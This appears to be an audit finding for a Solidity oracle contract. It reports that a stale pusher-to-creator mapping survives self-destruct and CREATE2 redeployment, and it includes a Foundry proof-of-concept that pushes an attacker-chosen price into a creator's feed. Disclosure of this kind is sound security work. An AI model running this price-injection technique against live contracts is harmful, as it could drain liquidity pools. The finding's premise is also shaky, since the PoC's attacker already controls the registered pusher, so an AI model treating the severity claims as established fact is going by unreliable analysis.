### Title
Stale `namespaceRemapping` entry after contract-pusher destruction allows unauthorized namespace writes — (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowContractPushers` verifies pusher consent via a **live** `staticcall` to `isPusher(creator)` at registration time and stores `namespaceRemapping[pusher] = creator`. However, this mapping is never invalidated if the pusher contract is later destroyed. If a new contract is deployed at the same address (via CREATE2), it silently inherits write authority over the creator's namespace through the `fallback` push path — without going through `allowContractPushers` again — and can push arbitrary prices into the creator's feeds.

---

### Finding Description

`allowContractPushers` explicitly relies on a **live** on-chain consent check:

> *"consent is proven by a LIVE `isPusher(creator)` staticcall instead of a signature, so there is nothing to replay and no deadline is needed."* [1](#0-0) 

The consent is verified once at registration time and the result is persisted in `namespaceRemapping`:

```solidity
(bool ok, bytes memory res) = pusher.staticcall(
    abi.encodeWithSignature("isPusher(address)", msg.sender)
);
require(ok);
bool allowed = abi.decode(res, (bool));
require(allowed);

namespaceRemapping[pusher] = msg.sender;   // ← persisted forever
```

The `fallback` push path then resolves the namespace purely from this mapping, with no liveness check on `msg.sender`:

```solidity
fallback() override external {
    address creator = namespaceRemapping[msg.sender];   // ← stale after destruction
    if (creator == address(0)) creator = msg.sender;
    ...
}
``` [2](#0-1) 

If the authorized pusher contract is destroyed (via `selfdestruct`) and a new contract is deployed at the same address (via CREATE2), the new contract inherits `namespaceRemapping[pusherContract] = creator` without the creator's knowledge or consent. Every fallback push from the new contract is attributed to the original creator's namespace, overwriting live feed data.

The analog to the MIMOProxy bug is exact: the registry (`namespaceRemapping`) stores an address whose liveness was verified at write time but is never re-verified at use time. The MIMOProxy fix added a codesize check before trusting the stored address; no equivalent guard exists here.

---

### Impact Explanation

An attacker who can deploy a contract at the same address as a destroyed pusher can push arbitrary `(price, spread0, spread1, timestamp)` tuples into the creator's namespace. These values are read directly by `getOracleData` / `price` and forwarded to `PriceProvider.getBidAndAskPrice`, which drives pool swap quotes. A manipulated mid-price or spread causes:

- **Swap conservation failure**: traders receive more output than the oracle curve permits, or the pool receives less input than owed.
- **Pool insolvency**: repeated bad-price swaps drain LP reserves below the level needed to cover outstanding claims. [3](#0-2) 

The `priceGuard` is optional and not set by default; if unset, no downstream clamp exists.

---

### Likelihood Explanation

The scenario requires:
1. A contract pusher that exposes `selfdestruct` (e.g., an upgradeable proxy or a pusher with an emergency-exit function).
2. The ability to redeploy at the same address via CREATE2 — feasible whenever the factory address and salt are known or predictable.

Both conditions are realistic in production deployments that use upgradeable or replaceable pusher contracts. The creator has no on-chain signal that the pusher was destroyed; they must proactively call `removePushers` to clear the stale entry, which they are unlikely to do without an off-chain alert.

---

### Recommendation

**Option A — codesize guard in `fallback`:** Track which `namespaceRemapping` entries were set by `allowContractPushers` in a separate `isContractPusher` mapping. In `fallback`, if `isContractPusher[msg.sender]` is true and `msg.sender.code.length == 0`, treat the mapping as stale and fall back to the pusher's own namespace (or revert).

**Option B — re-verify on each push:** For contract pushers, re-call `isPusher(creator)` in `fallback` before accepting the delegated namespace. This is gas-heavier but eliminates the stale-delegation window entirely.

**Option C — codesize check in `allowContractPushers`:** Analogous to the MIMOProxy fix — add `require(pusher.code.length > 0)` before the `staticcall`. This prevents re-registration of a destroyed address from silently succeeding after redeployment, but does not retroactively protect existing stale entries.

The minimal safe fix matching the MIMOProxy pattern:

```solidity
// In fallback, before using the remapping for a contract pusher:
address creator = namespaceRemapping[msg.sender];
if (creator != address(0) && isContractPusher[msg.sender] && msg.sender.code.length == 0) {
    creator = address(0); // stale entry — treat as self-push
}
if (creator == address(0)) creator = msg.sender;
```

// 1. Attacker-controlled pusher with selfdestruct
contract MaliciousPusher {
    function isPusher(address) external pure returns (bool) { return true; }
    function destroy() external { selfdestruct(payable(msg.sender)); }
}

// 2. Replacement contract that pushes arbitrary prices
contract ReplacementPusher {
    // no isPusher — inherits stale namespaceRemapping entry
}

// Test sequence (Foundry):
function testStaleDelegationAfterDestruction() public {
    MaliciousPusher pusher = new MaliciousPusher{salt: bytes32(0)}();

    // Creator registers the pusher
    vm.prank(creator);
    oracle.allowContractPushers(_pushers(address(pusher)));
    assertEq(oracle.namespaceRemapping(address(pusher)), creator);

    // Pusher self-destructs
    pusher.destroy();
    assertEq(address(pusher).code.length, 0);

    // namespaceRemapping still maps destroyed address → creator
    assertEq(oracle.namespaceRemapping(address(pusher)), creator);

    // Attacker redeploys at same address via CREATE2
    ReplacementPusher replacement = new ReplacementPusher{salt: bytes32(0)}();
    assertEq(address(replacement), address(pusher)); // same address

    // Replacement pushes arbitrary price into creator's namespace
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 fakePrice = _packRaw(9_999_999, 0, 0); // attacker-chosen price
    vm.prank(address(replacement));
    (bool ok,) = address(oracle).call(_wordAt(0, 0, fakePrice, tsMs));
    assertTrue(ok, "unauthorized push succeeded");

    // Creator's feed now contains attacker-controlled price
    IOffchainOracle.OracleData memory data =
        oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
    assertEq(data.price, U64x32.decode(uint32(fakePrice >> 16)),
        "attacker price landed in creator namespace");
}

    /// @notice Contract-pusher variant: consent is proven by a LIVE `isPusher(creator)`
    ///         staticcall instead of a signature, so there is nothing to replay and no
    ///         deadline is needed.
    function allowContractPushers(address[] calldata pushers) external {
        uint256 l = pushers.length;
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            (bool ok, bytes memory res) = pusher.staticcall(abi.encodeWithSignature("isPusher(address)", msg.sender));
            require(ok);
            bool allowed = abi.decode(res, (bool));
            require(allowed);

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
